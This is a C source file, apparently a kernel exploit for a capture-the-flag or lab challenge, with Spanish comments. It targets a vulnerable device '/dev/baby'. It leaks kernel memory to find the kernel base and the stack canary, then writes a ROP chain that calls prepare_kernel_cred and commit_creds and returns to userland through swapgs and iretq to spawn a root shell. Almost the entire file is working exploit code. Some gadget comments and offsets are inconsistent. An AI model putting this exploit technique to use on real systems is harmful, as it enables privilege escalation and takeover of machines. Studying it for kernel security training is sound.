#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/mman.h>

#include <unistd.h>
#include <signal.h>

//######################################################################
//######################################################################

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void pausa() {
    printf("[!] PAUSA - pulsa una tecla.\n");
    getchar();
}

int open_file(char *file, int flags, int verbose){
    // O_RDWR | O_RDONLY | O_WRONLY | O_APPEND | O_CREAT | O_DIRECTORY | O_NOFOLLOW | O_TMPFILE
    int fd = open(file, flags);
    if (fd < 0) {
        fatal("[!] Error al abrir el archivo.");
    } else {
        if (verbose) printf("[*] %s abierto con fd %d.\n", file, fd);
    }
    return fd;
}

void dump_buffer(void *buf, int len) {
    printf("\n[i] Dumping %d bytes.\n\n", len);
    for (int i = 0; i < len; i += 0x10){
        printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x08, i, (unsigned long)(buf + i));
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j));
        printf(" - 0x");
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j + 8));
        puts("");
    }
}

//######################################################################
//######################################################################

// Guardar el estado de los registros necesarios.
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}


//######################################################################
//######################################################################

int main(){
    char buff[0x1000];

    save_state();
    
    // Open vulnerable device
    int fd = open_file("/dev/baby", O_RDWR, 1);

    int res = read(fd, buff, 500);

    dump_buffer(buff, 500);

    unsigned long kernel_base = *(unsigned long*)(buff + 0x1d0) - (0xffffffff89fcaa4a - 0xffffffff89e00000);
    printf("[i] Kernel Base: 0x%lx\n", kernel_base);

    unsigned long canary = *(unsigned long*)(buff + 0x190);
    printf("[i] Kernel Canary: 0x%lx\n", canary);

    unsigned long modprobepath = kernel_base + 0x01444a40;
    printf("[i] Modprobe Path: 0x%lx\n", modprobepath);

    unsigned long pop_rdi = kernel_base + (0xffffffff81e001ab - 0xffffffff81000000); // pop rdi; ret;
    printf("[i] POP RDI: 0x%lx\n", pop_rdi);
    unsigned long pop_rsi = kernel_base + (0xffffffff81acb2ca - 0xffffffff81000000); // pop rdi; ret;
    printf("[i] POP RSI: 0x%lx\n", pop_rsi);

    unsigned long commit_creds = 0x00085fa0 + kernel_base; // commit_creds
    unsigned long prepare_kernel_cred = 0x000861d0 + kernel_base; // prepare_kernel_cred
    unsigned long swapgs = (0xffffffffaaa00a6f - 0xffffffffa9e00000) + kernel_base;  // swapgs_restore_regs_and_return_to_usermode
    unsigned long iretq  = (0xffffffff81c01537 - 0xffffffff81000000) + kernel_base;  // iretq;
    unsigned long swapgs_popfq = (0xffffffff81c00f0a - 0xffffffff81000000) + kernel_base; // swapgs; popfq; ret;

    printf("[i] Commit_creds: 0x%lx\n", commit_creds);
    printf("[i] Prepare_kernel_creds: 0x%lx\n", prepare_kernel_cred);
    printf("[i] swapgs: 0x%lx\n", swapgs);
    printf("[i] Pop_rdi: 0x%lx\n", pop_rdi);
    printf("[i] iretq: 0x%lx\n", iretq);
    printf("[i] swapgs_popfq: 0x%lx\n", swapgs_popfq);

    unsigned long long rop[0x200];
    memset(rop, 0, sizeof(rop));

    //rop[50] = canary;
    
    int idx = 50;
    rop[idx++] = canary;
    //rop[idx++] = 0;         // rbx
    //rop[idx++] = 0;         // rbp
    //rop[idx++] = 0;         // r12
    rop[idx++] = pop_rdi;
    rop[idx++] = 0;					
    rop[idx++] = prepare_kernel_cred;
    rop[idx++] = commit_creds;			 
    rop[idx++] = swapgs_popfq;
    rop[idx++] = 0;
    rop[idx++] = iretq;
    rop[idx++] = (unsigned long)get_shell;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_sp;
    rop[idx++] = user_ss;

    int rop_length = idx * 8;				// ROP length

    signal(SIGSEGV, get_shell);			

    write(fd, rop, rop_length);


    return 0;
}